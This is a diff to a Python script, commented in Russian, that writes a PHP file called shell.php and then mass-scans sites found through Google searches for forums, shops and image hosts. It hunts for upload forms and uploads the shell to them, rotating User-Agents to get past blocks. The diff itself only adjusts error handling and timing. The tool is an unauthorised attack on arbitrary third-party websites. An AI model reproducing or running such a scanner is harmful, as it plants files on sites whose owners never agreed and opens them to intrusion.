@@ -4,6 +4,7 @@ from googlesearch import search
 from random import choice
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
+import time
 
 # Готовим файл для теста
 payload_file = "shell.php"
@@ -13,7 +14,7 @@ with open(payload_file, 'w') as f:
 echo "Шелл загружен!"; 
 phpinfo();
 ?>
-    """)  # Простой PHP код для теста
+    """)
 
 # Список User-Agent'ов для обхода блокировок
 USER_AGENTS = [
@@ -27,7 +28,7 @@ GREEN = "\033[92m"
 RED = "\033[91m"
 RESET = "\033[0m"
 
-# Тематики для поиска (сайты с формами загрузки файлов)
+# Тематики для поиска
 themes = [
     "news upload",                # Новостные сайты
     "forum upload",               # Форумы
@@ -38,7 +39,7 @@ themes = [
     "image upload",               # Сайты для загрузки изображений
     "community upload",           # Сайты сообщества
     "discussion upload",          # Обсуждения и форумы
-    "e-commerce upload",          # Интернет-магазины (e-commerce)
+    "e-commerce upload",          # Интернет-магазины
     "online store upload",        # Онлайн магазины
     "shop upload",                # Интернет-магазины с возможностью загрузки
     "product upload",             # Магазины, где можно загружать изображения товаров
@@ -84,7 +85,7 @@ async def scan_for_file_upload(session, url):
                     else:
                         print(f"{url} - {RED}Ошибка при загрузке файла: {result}{RESET}")
                     # Не прерываем, продолжаем сканировать другие сайты
-                    break  # Прерываем проверку форм, но продолжаем сканирование других сайтов
+                    return  # Выходим из этой формы и переходим к следующему сайту
 
     except Exception as e:
         print(f"Ошибка при обработке сайта {url}: {str(e)}")
@@ -135,16 +136,16 @@ async def scan_sites_from_themes():
             tasks.append(scan_for_file_upload(session, url))
 
         # Параллельное выполнение всех задач
-        results = await asyncio.gather(*tasks)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
 
-        # Дополнительная обработка ошибок после сканирования всех сайтов
-        failed_urls = [url for url, result in zip(all_urls, results) if result is None]
-        
-        # Повторная обработка сайтов с ошибками
-        if failed_urls:
-            print(f"Повторная попытка для сайтов с ошибками: {len(failed_urls)}")
-            tasks = [scan_for_file_upload(session, url) for url in failed_urls]
-            await asyncio.gather(*tasks)
+        # Логируем ошибки
+        for result in results:
+            if isinstance(result, Exception):
+                print(f"Произошла ошибка: {str(result)}")
 
 # Запуск асинхронного сканирования
+start_time = time.time()
 asyncio.run(scan_sites_from_themes())
+end_time = time.time()
+
+print(f"Время выполнения: {end_time - start_time} секунд.")
